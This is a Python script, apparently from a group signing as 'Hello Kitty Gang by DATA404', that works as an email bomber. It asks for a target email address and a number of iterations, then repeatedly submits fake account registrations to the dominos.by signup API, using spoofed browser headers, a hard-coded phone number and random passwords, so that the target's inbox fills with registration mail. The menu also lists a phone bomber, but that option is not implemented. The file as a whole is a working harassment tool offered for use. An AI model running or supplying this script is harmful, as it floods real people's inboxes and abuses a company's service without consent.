import uuid
import functools
import requests
import asyncio
from termcolor import colored

print(colored("""
    ´´´´´´´¶¶¶¶´´´´´´´´´´´´´´´´´´
´´´´´´¶¶´´´´¶¶¶¶¶´´¶¶¶¶´¶¶¶¶´´
´´´´´´¶´´´´´´´´´´¶¶¶¶´¶¶´´´´¶´
´´´´´´¶´´´´´´´´´´¶´¶¶¶¶¶¶´´´¶´
´´´´´¶´´´´´´´´´´¶¶¶¶¶´´´¶¶¶¶¶´
´´´´¶´´´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶´
´´´¶´´´´´´´´´´´´´´´´´´´¶¶¶¶¶´´
´¶¶¶´´´´´¶´´´´´´´´´´´´´´´´´¶´´
´´´¶´´´´¶¶´´´´´´´´´´´´´´´´´¶´´
´´´¶¶´´´´´´´´´´´´´´´´¶¶´´´´¶´´
´´¶¶¶´´´´´´´´´¶¶¶´´´´¶¶´´´¶¶´´
´´´´´¶¶´´´´´´´´´´´´´´´´´´¶¶¶´´
´´´´´´´¶¶¶´´´´´´´´´´´´´¶¶¶´´´´
´´´¶¶¶¶¶´¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶´´´´´´
´´´¶´´´´¶¶¶¶¶´´´´¶¶¶¶´´´¶´´´´´
´´´¶´´´´¶¶¶´¶¶¶¶¶¶¶¶´´´¶¶¶´´´´
´´´¶¶¶¶¶¶¶¶¶¶¶¶¶´´¶¶¶¶¶´´´¶¶´´
´´¶´´´´´´¶¶¶¶¶¶¶¶¶¶¶´´´´´´´¶´´
´¶´´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´¶´´
´´¶´´´´´´´´¶¶¶¶¶¶¶¶´´´´´´´´¶´´
´´¶¶´´´´´´´¶¶´´´´¶¶´´´´´´¶¶´´´
´´´´¶¶¶¶¶¶¶´´´´´´´´¶¶¶¶¶¶´´
´´´´´´´HELLO´´KITTY´GANG´´´
´´´´´´´BY´´DATA404´´´´´´´
""", "magenta"))

domios_headers = {
    'Connection': 'keep-alive',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Content-Type': 'application/json;charset=UTF-8',
    'Accept': 'application/json, text/plain, */*',
    'sec-ch-ua-platform': '"macOS"',
    'Origin': 'https://dominos.by',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://dominos.by/user'
}


def update_data(email):
    dominos_data = "{{\"email\":\"{1}\", \"phone\":\"375293345467\",\"password\": \"{0}\"}}".format(
        str(uuid.uuid4()).replace('-', ''), email)
    return dominos_data


async def email_bomber(dominos_data):
    loop = asyncio.get_event_loop()
    print(colored("Started Dominos", "blue"))
    feature_dominos = loop.run_in_executor(None, lambda: requests.request('POST',
                                                                          url='https://dominos.by/api/web/user/register?language=ru&cityId=2',
                                                                          headers=domios_headers, data=dominos_data))
    response_dominos = await feature_dominos
    if response_dominos.status_code == 200:
        print(colored("Dominos sent successful", "blue"))
    else:
        print(colored("Dominos Failure", "red"))


if __name__ == '__main__':
    option = int(input(colored("Chose desirable option... [1] - Email bomber, [2] - phone bomber \n", "blue")))
    count = int(input(colored("How much iterations u want? ", "blue")))
    if option == 1:
        email = input(colored("Enter target email:", "yellow"))
        data = update_data(email.strip())
        loop = asyncio.get_event_loop()
        for i in range(count):
            loop.run_until_complete(email_bomber(dominos_data=data))